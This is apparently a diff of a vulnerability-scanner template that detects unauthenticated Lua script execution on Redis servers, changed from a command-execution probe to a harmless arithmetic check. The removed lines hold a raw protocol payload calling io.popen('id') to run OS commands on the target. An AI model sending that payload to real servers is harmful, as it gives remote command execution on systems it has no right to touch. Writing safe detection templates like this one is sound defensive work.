@@ -1,25 +1,26 @@
 id: redis-lua-rce
 
 info:
-  name: Redis Lua io.popen RCE
+  name: Redis Lua EVAL Script Execution
   author: assay
-  severity: critical
+  severity: high
   description: |
     Redis server allows unauthenticated Lua script execution via EVAL.
-    The io.popen function is not sandboxed in Redis <= 6.x, allowing
-    arbitrary OS command execution. Confirmed running as the Redis
-    process user (often root in Docker containers).
+    On instances without strict Lua mode, io.popen/os.execute give OS
+    command execution. Even with strict Lua, redis.call() from scripts
+    can read/write all data. Detected by executing a safe arithmetic
+    eval that returns a known marker.
   tags: network,redis,rce,lua
 
-network:
+tcp:
   - inputs:
-      - data: "*3\r\n$4\r\nEVAL\r\n$74\r\nlocal f = io.popen('id'); local s = f:read('*a'); f:close(); return s\r\n$1\r\n0\r\n"
+      - data: "*3\r\n$4\r\nEVAL\r\n$13\r\nreturn 7*1337\r\n$1\r\n0\r\n"
     host:
       - "{{Hostname}}"
-    port: "{{Port}}"
-    read-size: 256
+    port: 6379
+    read-size: 64
 
     matchers:
-      - type: regex
-        regex:
-          - "uid=[0-9]+\\([a-z]+\\)\\s+gid=[0-9]+"
+      - type: word
+        words:
+          - ":9359"
